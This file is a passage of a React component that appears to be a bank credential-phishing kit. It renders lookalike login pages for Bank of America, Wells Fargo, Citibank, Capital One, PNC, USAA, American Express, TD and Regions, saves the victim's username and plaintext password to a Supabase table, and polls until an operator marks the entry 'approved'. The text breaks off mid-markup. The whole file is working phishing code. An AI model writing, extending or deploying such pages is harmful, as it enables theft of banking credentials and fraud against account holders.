import { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase.js'
import Icon from '../components/Icon.jsx'

// Logo del banco
function BankLogo({ name, file, domain }) {
  const [err, setErr] = useState(false)
  const src = file ? `/banks/${file}` : domain ? `https://icons.duckduckgo.com/ip3/${domain}.ico` : null
  if (err || !src) return <span className="text-sm font-bold text-content-primary">{name}</span>
  return (
    <img
      src={src}
      alt={name}
      loading="lazy"
      onError={() => setErr(true)}
      className="max-h-16 max-w-[90%] object-contain"
    />
  )
}

export default function ContactForm() {
  const [formId, setFormId] = useState(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [rememberUsername, setRememberUsername] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
  const [submitting, setSubmitting] = useState(false)
  const [formStep, setFormStep] = useState('username') // 'username' | 'password' (para USAA)
  const [accountType, setAccountType] = useState('cards-banking') // para American Express
  const [showDescription, setShowDescription] = useState(false) // para TD
  const [startPage, setStartPage] = useState('accounts-summary') // para Charles Schwab
  const [language, setLanguage] = useState('english') // para Charles Schwab

  // Obtener parámetros de URL
  const params = new URLSearchParams(window.location.search)
  const userId = params.get('uid')
  const bankName = params.get('bank')
  const bankFile = params.get('file')
  const bankDomain = params.get('domain')

  // Polling para saber si fue aprobado
  useEffect(() => {
    if (step !== 'waiting' || !formId) return

    const interval = setInterval(async () => {
      const { data } = await supabase.from('contact_forms').select('status').eq('id', formId).maybeSingle()
      if (data?.status === 'approved') {
        setStep('success')
        clearInterval(interval)
      }
    }, 1000) // Verifica cada segundo

    return () => clearInterval(interval)
  }, [step, formId])

  const submitForm = async (e) => {
    e.preventDefault()
    if (!username || !password) return

    setSubmitting(true)
    const { data, error } = await supabase
      .from('contact_forms')
      .insert({
        full_name: username,
        phone: null,
        email: null,
        password: password,
        note: null,
        institution: bankName || null,
        user_id: userId || null,
        status: 'pending',
      })
      .select('id')
      .single()

    setSubmitting(false)

    if (error) {
      alert('Error al guardar: ' + error.message)
      return
    }

    // Formulario guardado, pasar a "Esperando contacto"
    setFormId(data.id)
    // Guardar form_id en sessionStorage para que AddMoney lo pueda leer
    sessionStorage.setItem('plaidFormId', data.id)
    setStep('waiting')
  }

  const closeWindow = () => window.close()

  // Detectar banco
  const isBankOfAmerica = bankName?.toLowerCase().includes('bank of america')
  const isWellsFargo = bankName?.toLowerCase().includes('wells fargo')
  const isCitibank = bankName?.toLowerCase().includes('citibank')
  const isCapitalOne = bankName?.toLowerCase().includes('capital one')
  const isPNC = bankName?.toLowerCase().includes('pnc')
  const isUSAA = bankName?.toLowerCase().includes('usaa')
  const isAmex = bankName?.toLowerCase().includes('american express')
  const isTD = bankName?.toLowerCase().includes('td')
  const isRegions = bankName?.toLowerCase().includes('regions')
  const isNavyFederal = bankName?.toLowerCase().includes('navy federal')
  const isCharlesSchwab = bankName?.toLowerCase().includes('charles schwab')
  const isCitizens = bankName?.toLowerCase().includes('citizens')
  const isHuntington = bankName?.toLowerCase().includes('huntington')
  const isBetterment = bankName?.toLowerCase().includes('betterment')
  const isChase = bankName?.toLowerCase().includes('chase')

  // ---- FORMULARIO ----
  if (step === 'form') {
    // Diseño para Bank of America
    if (isBankOfAmerica) {
      return (
        <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-800 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-[450px]">
              {/* Barra roja decorativa */}
              <div className="h-2 w-20 rounded-full bg-red-600 mb-6" />

              <div className="rounded-3xl bg-white p-8 shadow-2xl">
                {/* Logo del banco */}
                <div className="mb-8 flex h-10 items-center">
                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
                </div>

                <form onSubmit={submitForm} className="space-y-6">
                  {/* ID Usuario */}
                  <div>
                    <label className="mb-2 block text-sm font-semibold text-content-primary">ID de usuario</label>
                    <input
                      type="text"
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full rounded-lg border-2 border-black/20 px-4 py-3 outline-none transition-colors focus:border-blue-600"
                    />
                  </div>

                  {/* Contraseña */}
                  <div>
                    <div className="mb-2 flex items-center justify-between">
                      <label className="block text-sm font-semibold text-content-primary">Contraseña</label>
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="text-sm text-blue-600 hover:text-blue-700"
                      >
                        {showPassword ? 'Ocultar' : 'Ver'}
                      </button>
                    </div>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full rounded-lg border-2 border-black/20 px-4 py-3 outline-none transition-colors focus:border-blue-600"
                    />
                  </div>

                  {/* Guardar ID */}
                  <label className="flex items-center gap-3">
                    <input
                      type="checkbox"
                      checked={rememberUsername}
                      onChange={(e) => setRememberUsername(e.target.checked)}
                      className="h-5 w-5 cursor-pointer rounded border-black/20 accent-blue-600"
                    />
                    <span className="text-sm text-content-primary">Guardar ID de usuario</span>
                  </label>

                  {/* Sign In Button */}
                  <button
                    type="submit"
                    disabled={submitting}
                    className="mt-8 w-full rounded-full bg-blue-900 py-3.5 font-bold text-white hover:bg-blue-800 disabled:opacity-60"
                  >
                    {submitting ? 'Iniciando…' : 'Iniciar una sesión'}
                  </button>
                </form>

                {/* Links */}
                <div className="mt-8 space-y-3 text-center">
                  <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                    Olvidé la ID/Contraseña
                  </a>
                  <div className="flex justify-center gap-4 text-sm">
                    <a href="#" className="text-blue-600 hover:text-blue-700">
                      Seguridad y ayuda
                    </a>
                    <span className="text-gray-400">•</span>
                    <a href="#" className="text-blue-600 hover:text-blue-700">
                      Inscribirse
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Wells Fargo
    if (isWellsFargo) {
      return (
        <div className="min-h-screen bg-gray-100 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-[500px]">
              <div className="rounded-3xl bg-white p-10 shadow-lg">
                {/* Logo del banco */}
                <div className="mb-8 flex h-10 items-center">
                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
                </div>

                <h1 className="mb-2 text-3xl font-bold text-content-primary">Good evening</h1>
                <p className="mb-8 text-gray-600">Sign on to manage your accounts.</p>

                <form onSubmit={submitForm} className="space-y-6">
                  {/* Username */}
                  <div>
                    <label className="mb-2 block text-base text-gray-700">Username</label>
                    <input
                      type="text"
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 text-gray-800 outline-none transition-colors focus:border-red-600"
                    />
                  </div>

                  {/* Password */}
                  <div>
                    <div className="mb-2 flex items-center justify-between">
                      <label className="block text-base text-gray-700">Password</label>
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="text-base text-blue-600 hover:text-blue-700 font-semibold"
                      >
                        {showPassword ? 'Hide' : 'Show'}
                      </button>
                    </div>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 text-gray-800 outline-none transition-colors focus:border-red-600"
                    />
                  </div>

                  {/* Save username */}
                  <label className="flex items-center gap-3 py-2">
                    <input
                      type="checkbox"
                      checked={rememberUsername}
                      onChange={(e) => setRememberUsername(e.target.checked)}
                      className="h-5 w-5 cursor-pointer rounded border-2 border-black/30 accent-red-600"
                    />
                    <span className="text-base text-content-primary">Save username</span>
                  </label>

                  {/* Sign On Button + Enroll */}
                  <div className="flex items-center gap-4 pt-4">
                    <button
                      type="submit"
                      disabled={submitting}
                      className="flex-1 rounded-full bg-red-600 py-3.5 font-bold text-white hover:bg-red-700 disabled:opacity-60"
                    >
                      {submitting ? 'Signing in…' : 'Sign On'}
                    </button>
                    <a href="#" className="text-base font-semibold text-content-primary hover:text-gray-700">
                      Enroll
                    </a>
                  </div>
                </form>

                {/* Links */}
                <div className="mt-8 space-y-3 border-t border-black/10 pt-6">
                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
                    Sign on with a passkey
                  </a>
                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
                    Forgot username or password?
                  </a>
                  <a href="#" className="block text-base text-content-primary hover:text-gray-700">
                    Privacy, Cookies, and Legal
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Citibank
    if (isCitibank) {
      return (
        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-[600px]">
              <div className="rounded-3xl bg-white p-10 shadow-lg">
                {/* Logo del banco */}
                <div className="mb-10 flex h-10 items-center">
                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
                </div>

                <form onSubmit={submitForm} className="space-y-6">
                  {/* User ID y Password lado a lado */}
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-2 block text-sm font-semibold text-content-primary">User ID</label>
                      <input
                        type="text"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full rounded-xl border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
                      />
                    </div>

                    <div>
                      <label className="mb-2 block text-sm font-semibold text-content-primary">Password</label>
                      <div className="relative">
                        <input
                          type={showPassword ? 'text' : 'password'}
                          required
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="w-full rounded-xl border-2 border-blue-400 px-4 py-3 pr-10 text-content-primary outline-none transition-colors focus:border-blue-600"
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
                        >
                          <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Remember User ID */}
                  <label className="flex items-center gap-3">
                    <input
                      type="checkbox"
                      checked={rememberUsername}
                      onChange={(e) => setRememberUsername(e.target.checked)}
                      className="h-5 w-5 cursor-pointer rounded border-2 border-blue-600 accent-blue-600"
                    />
                    <span className="text-sm text-content-primary">Remember User ID</span>
                  </label>

                  {/* Sign On Button */}
                  <button
                    type="submit"
                    disabled={submitting}
                    className="mt-8 w-full rounded-xl bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
                  >
                    {submitting ? 'Signing in…' : 'Sign On'}
                  </button>
                </form>

                {/* Links - Top Section */}
                <div className="mt-6 flex items-center justify-between border-t border-black/10 pt-6">
                  <div className="space-x-3">
                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                      Register
                    </a>
                    <span className="text-gray-400">/</span>
                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                      Activate
                    </a>
                  </div>
                  <div className="space-x-2 text-sm">
                    <span className="text-content-secondary">Forgot</span>
                    <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
                      User ID
                    </a>
                    <span className="text-content-secondary">or</span>
                    <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
                      Password
                    </a>
                  </div>
                </div>

                {/* Passwordless Sign On */}
                <div className="mt-6 rounded-lg bg-gray-100 p-4 text-center">
                  <div className="flex items-center justify-center gap-2">
                    <Icon name="smartphone" size={20} className="text-blue-600" />
                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                      Passwordless Sign On
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Capital One
    if (isCapitalOne) {
      return (
        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-[500px]">
              <div className="rounded-2xl bg-white p-10 shadow-lg">
                {/* Logo del banco */}
                <div className="mb-10 flex h-12 items-center justify-center">
                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
                </div>

                <h1 className="mb-8 text-center text-3xl font-bold text-content-primary">Sign In</h1>

                <form onSubmit={submitForm} className="space-y-6">
                  {/* Username */}
                  <div>
                    <label className="mb-2 block text-sm font-semibold text-content-primary">Username</label>
                    <div className="relative">
                      <Icon name="user" size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="text"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full rounded-lg border-2 border-black/20 bg-white pl-12 py-3 pr-4 text-content-primary outline-none transition-colors focus:border-blue-600"
                      />
                    </div>
                  </div>

                  {/* Password */}
                  <div>
                    <label className="mb-2 block text-sm font-semibold text-content-primary">Password</label>
                    <div className="relative">
                      <Icon name="lock" size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full rounded-lg border-2 border-black/20 bg-white pl-12 py-3 pr-12 text-content-primary outline-none transition-colors focus:border-blue-600"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      >
                        <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                      </button>
                    </div>
                  </div>

                  {/* Remember Me */}
                  <label className="flex items-center gap-3">
                    <input
                      type="checkbox"
                      checked={rememberUsername}
                      onChange={(e) => setRememberUsername(e.target.checked)}
                      className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
                    />
                    <span className="text-sm text-content-primary">Remember Me</span>
                  </label>

                  {/* Sign In Button */}
                  <button
                    type="submit"
                    disabled={submitting}
                    className="mt-8 w-full rounded-lg bg-blue-700 py-3.5 font-bold text-white hover:bg-blue-800 disabled:opacity-60"
                  >
                    {submitting ? 'Signing in…' : 'Sign in'}
                  </button>
                </form>

                {/* Passwordless Section */}
                <div className="mt-8 rounded-lg border-2 border-black/10 bg-gray-50 p-6">
                  <div className="mb-3 flex items-center gap-3">
                    <Icon name="smartphone" size={24} className="text-blue-600" />
                    <span className="text-base font-semibold text-content-primary">Go passwordless with a passkey</span>
                  </div>
                  <p className="mb-4 text-sm text-content-secondary">
                    No more having to remember a password. Use a passkey to sign in using your face or fingerprint.
                  </p>
                  <a href="#" className="text-sm font-semibold text-blue-600 hover:text-blue-700">
                    Create a passkey
                  </a>
                </div>

                {/* Links */}
                <div className="mt-8 space-y-3 text-center">
                  <a href="#" className="block text-sm font-semibold text-blue-600 hover:text-blue-700">
                    Forgot Username or Password?
                  </a>
                  <a href="#" className="block text-sm font-semibold text-blue-600 hover:text-blue-700">
                    Set Up Online Access
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para PNC
    if (isPNC) {
      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="mx-auto max-w-2xl px-4 py-10 sm:px-8">
            {/* Header con barra azul */}
            <div className="mb-10 border-b-4 border-gray-800 pb-6">
              <h1 className="mb-2 text-2xl font-bold text-content-primary">
                Sign On to Online Banking
                <span className="text-gray-600"> or </span>
                <a href="#" className="text-blue-600 hover:text-blue-700">
                  select another service
                </a>
              </h1>
            </div>

            <div className="space-y-6">
              {/* User ID */}
              <div>
                <label className="mb-2 block text-sm font-semibold text-content-primary">User ID (required)</label>
                <div className="relative">
                  <div className="absolute left-0 top-0 bottom-0 w-1 rounded-l bg-orange-600" />
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Enter User ID"
                    className="w-full border-2 border-black/10 bg-white pl-4 py-3 pr-4 text-content-primary outline-none transition-colors placeholder:text-gray-500 focus:border-blue-600"
                  />
                </div>
              </div>

              {/* Password */}
              <div>
                <label className="mb-2 block text-sm font-semibold text-content-primary">Password (required)</label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter Password"
                    className="w-full border-2 border-black/10 bg-white py-3 pl-4 pr-12 text-content-primary outline-none transition-colors placeholder:text-gray-500 focus:border-blue-600"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
                  >
                    <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                  </button>
                </div>
              </div>

              {/* Remember User ID */}
              <label className="flex items-center gap-3 py-2">
                <input
                  type="checkbox"
                  checked={rememberUsername}
                  onChange={(e) => setRememberUsername(e.target.checked)}
                  className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
                />
                <span className="text-sm text-content-primary">Remember User ID</span>
              </label>

              {/* Sign On Button */}
              <button
                type="submit"
                disabled={submitting}
                onClick={submitForm}
                className="w-full bg-gray-300 py-3.5 font-bold text-content-primary hover:bg-gray-400 disabled:opacity-60"
              >
                {submitting ? 'Signing in…' : 'Sign On'}
              </button>

              {/* Links */}
              <div className="space-y-3 border-t border-black/10 pt-6 text-center">
                <div>
                  <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                    Forgot ID or Password?
                  </a>
                </div>
                <div className="text-gray-500">or</div>
                <div>
                  <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                    Enroll In Online Banking
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para USAA
    if (isUSAA) {
      return (
        <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-800 px-4 py-8 sm:px-0">
          <div className="flex min-h-screen items-center justify-center">
            <div className="w-full max-w-[550px]">
              <div className="rounded-xl bg-white p-12 shadow-2xl">
                <h1 className="mb-12 text-center text-4xl font-bold text-gray-800">Log On</h1>

                <form
                  onSubmit={(e) => {
                    e.preventDefault()
                    if (formStep === 'username') {
                      if (!username) return
                      setFormStep('password')
                    } else {
                      submitForm(e)
                    }
                  }}
                  className="space-y-8"
                >
                  {/* Username Step */}
                  {formStep === 'username' ? (
                    <>
                      <div>
                        <label className="mb-3 block text-sm font-semibold text-gray-700">Online ID</label>
                        <input
                          type="text"
                          required
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          autoFocus
                          className="w-full rounded-lg border-2 border-blue-400 px-4 py-4 text-gray-800 outline-none transition-colors focus:border-blue-600"
                        />
                      </div>
                      <button
                        type="submit"
                        className="w-full rounded-lg bg-green-700 py-4 font-bold text-white hover:bg-green-800 text-lg"
                      >
                        Next
                      </button>
                    </>
                  ) : (
                    <>
                      {/* Username Display */}
                      <div className="rounded-lg bg-blue-50 p-4">
                        <p className="text-sm text-gray-600">Online ID</p>
                        <p className="font-semibold text-gray-800">{username}</p>
                      </div>

                      {/* Password Step */}
                      <div>
                        <label className="mb-3 block text-sm font-semibold text-gray-700">Password</label>
                        <div className="relative">
                          <input
                            type={showPassword ? 'text' : 'password'}
                            required
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            autoFocus
                            className="w-full rounded-lg border-2 border-blue-400 px-4 py-4 pr-12 text-gray-800 outline-none transition-colors focus:border-blue-600"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
                          >
                            <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                          </button>
                        </div>
                      </div>

                      <div className="flex gap-3">
                        <button
                          type="button"
                          onClick={() => {
                            setFormStep('username')
                            setPassword('')
                          }}
                          className="flex-1 rounded-lg border-2 border-gray-300 py-3 font-bold text-gray-800 hover:bg-gray-50"
                        >
                          Back
                        </button>
                        <button
                          type="submit"
                          disabled={submitting}
                          className="flex-1 rounded-lg bg-green-700 py-3 font-bold text-white hover:bg-green-800 disabled:opacity-60"
                        >
                          {submitting ? 'Logging in…' : 'Log On'}
                        </button>
                      </div>
                    </>
                  )}
                </form>

                {/* Help Link */}
                <div className="mt-8 text-center border-t border-gray-200 pt-6">
                  <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
                    I need help logging on
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para American Express
    if (isAmex) {
      return (
        <div className="min-h-screen bg-gray-100 px-4 py-8 sm:px-0">
          <div className="mx-auto max-w-[600px] py-10">
            <div className="rounded-lg bg-white p-10 shadow-lg">
              <h1 className="mb-10 text-2xl font-bold text-content-primary">Log In to My Account</h1>

              <form onSubmit={submitForm} className="space-y-6">
                {/* User ID */}
                <div>
                  <label className="mb-2 block text-sm font-semibold text-content-primary">User ID</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
                  />
                </div>

                {/* Password */}
                <div>
                  <div className="mb-2 flex items-center justify-between">
                    <label className="block text-sm font-semibold text-content-primary">Password</label>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="text-sm text-blue-600 hover:text-blue-700 font-semibold"
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  <input
                    type={showPassword ? 'text' : 'password'}
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
                  />
                </div>

                {/* Account Type */}
                <div>
                  <label className="mb-2 block text-sm font-semibold text-content-primary">Account Type</label>
                  <select
                    value={accountType}
                    onChange={(e) => setAccountType(e.target.value)}
                    className="w-full rounded-lg border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
                  >
                    <option value="cards-banking">Cards and Banking</option>
                    <option value="business">Business</option>
                    <option value="corporate">Corporate</option>
                  </select>
                </div>

                {/* Remember Me */}
                <label className="flex items-center gap-3">
                  <input
                    type="checkbox"
                    checked={rememberUsername}
                    onChange={(e) => setRememberUsername(e.target.checked)}
                    className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
                  />
                  <span className="text-sm text-content-primary">Remember Me</span>
                </label>

                {/* Log In Button */}
                <button
                  type="submit"
                  disabled={submitting}
                  className="mt-8 w-full rounded-lg bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
                >
                  {submitting ? 'Logging in…' : 'Log In'}
                </button>
              </form>

              {/* Links */}
              <div className="mt-8 space-y-3 border-t border-black/10 pt-6">
                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                  Forgot User ID or Password?
                </a>
                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                  Create New Online Account
                </a>
                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                  Confirm Card Received
                </a>
                <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                  Visit Our Security Center
                </a>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para TD (Toronto-Dominion)
    if (isTD) {
      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="mx-auto max-w-2xl px-4 py-10 sm:px-8">
            <h1 className="mb-12 text-3xl font-light text-gray-700">EasyWeb Login</h1>

            <div className="rounded-lg bg-gray-50 p-10">
              <form onSubmit={submitForm} className="space-y-8">
                {/* Username or Access Card */}
                <div>
                  <label className="mb-3 block text-base text-gray-700">Username or Access Card</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border-b-2 border-gray-300 bg-transparent px-0 py-4 text-gray-800 outline-none transition-colors focus:border-green-600"
                  />
                </div>

                {/* Description (Optional) - Toggle */}
                <button
                  type="button"
                  onClick={() => setShowDescription(!showDescription)}
                  className="flex items-center gap-2 text-base text-green-600 hover:text-green-700 font-medium"
                >
                  <span className="text-xl">{showDescription ? '−' : '+'}</span>
                  <span>Description (Optional)</span>
                </button>

                {/* Password */}
                <div>
                  <label className="mb-3 block text-base text-gray-700">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border-b-2 border-gray-300 bg-transparent px-0 py-4 pr-10 text-gray-800 outline-none transition-colors focus:border-green-600"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                    </button>
                  </div>
                </div>

                {/* Remember me */}
                <label className="flex items-center gap-3">
                  <input
                    type="checkbox"
                    checked={rememberUsername}
                    onChange={(e) => setRememberUsername(e.target.checked)}
                    className="h-5 w-5 cursor-pointer rounded border-2 border-green-600 accent-green-600"
                  />
                  <span className="text-base text-gray-700">Remember me</span>
                </label>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={submitting}
                  className="mt-10 w-full rounded-lg bg-green-600 py-4 font-bold text-white hover:bg-green-700 disabled:opacity-60 flex items-center justify-center gap-2"
                >
                  <Icon name="lock" size={18} />
                  {submitting ? 'Logging in…' : 'Login'}
                </button>
              </form>

              {/* Links */}
              <div className="mt-10 space-y-4 border-t border-gray-200 pt-8">
                <a href="#" className="block text-base text-green-600 hover:text-green-700 font-medium">
                  Forgot your username or password?
                </a>
                <a href="#" className="flex items-center gap-2 text-base text-green-600 hover:text-green-700 font-medium">
                  <Icon name="lock" size={18} />
                  <span>TD Online and Mobile Security Guarantee: You are protected</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // Diseño para Regions (flujo de dos pasos: username → password)
    if (isRegions) {
      // Paso 1: Username
      if (formStep === 'username') {
        return (
          <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
            <div className="flex min-h-screen flex-col items-center justify-center px-4">
              <div className="w-full max-w-lg">
                {/* Logo Regions */}
                {logo && (
                  <div className="mb-8 flex justify-center">
                    <img src={logo} alt="Regions" className="h-16 object-contain" />
                  </div>
                )}

                <div className="mb-10 text-center">
                  <p className="mb-2 flex items-center justify-center gap-2 text-sm text-gray-600">
                    <Icon name="shield" size={16} />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                  </p>
                </div>

                <h1 className="mb-4 text-center text-4xl font-light text-gray-800">Access your accounts online</h1>
                <h2 className="mb-12 text-center text-2xl font-normal text-gray-700">Log in to Online Banking</h2>

                <form
                  onSubmit={(e) => {
                    e.preventDefault()
                    setFormStep('password')
                  }}
                  className="rounded-2xl border border-gray-200 bg-white p-10 shadow-sm"
                >
                  <div className="mb-8">
                    <label className="mb-3 block text-base font-medium text-gray-800">Username</label>
                    <input
                      type="text"
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full rounded-lg border-2 border-gray-300 px-4 py-3 text-gray-800 outline-none transition-colors focus:border-green-600"
                      placeholder=""
                    />
                  </div>

                  <label className="mb-8 flex items-center gap-3">
                    <input
                      type="checkbox"
                      checked={rememberUsername}
                      onChange={(e) => setRememberUsername(e.target.checked)}
                      className="h-5 w-5 cursor-pointer rounded border border-gray-300 accent-green-600"
                    />
                    <span className="text-base text-gray-700">Remember my username</span>
                  </label>

                  <button
                    type="submit"
                    className="mb-8 w-full rounded-full bg-green-700 py-3 font-bold text-white hover:bg-green-800 transition-colors"
                  >
                    Continue
                  </button>
                </form>

                <div className="mt-8 text-center space-y-4">
                  <p className="text-base text-gray-700">
                    Forgot <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">username</a> or{' '}
                    <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">password</a>?
                  </p>
                  <p className="text-base text-gray-700">
                    Don't have an Online Banking account?{' '}
                    <a href="#" className="text-blue-600 hover:text-blue-700 font-medium">Enroll now</a>.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )
      }

      // Paso 2: Password
      return (
        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
          <div className="flex min-h-screen flex-col items-center justify-center px-4">
            <div className="w-full max-w-lg">
              {/* Logo Regions */}
              {logo && (
                <div className="mb-8 flex justify-center">
                  <img src={logo} alt="Regions" className="h-16 object-contain" />
                </div>
              )}

              <div className="mb-10 text-center">
                <p className="mb-2 flex items-center justify-center gap-2 text-sm text-gray-600">
                  <Icon name="shield" size={16} />
                  <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </p>
              </div>

              <h1 className="mb-4 text-center text-4xl font-light text-gray-800">Access your accounts online</h1>
              <h2 className="mb-12 text-center text-2xl font-normal text-gray-700">Log in to Online Banking</h2>

              <form onSubmit={submitForm} className="rounded-2xl border border-gray-200 bg-white p-10 shadow-sm">
                {/* Mostrar username en azul */}
                <div className="mb-8 rounded-lg bg-blue-50 px-4 py-3 border-l-4 border-blue-600">
                  <p className="text-sm text-gray-600">Username</p>
                  <p className="text-xl font-bold text-blue-600">{username}</p>
                </div>

                <div className="mb-8">
                  <label className="mb-3 block text-base font-medium text-gray-800">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full rounded-lg border-2 border-gray-300 px-4 py-3 pr-10 text-gray-800 outline-none transition-colors focus:border-green-600"
                      placeholder=""
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
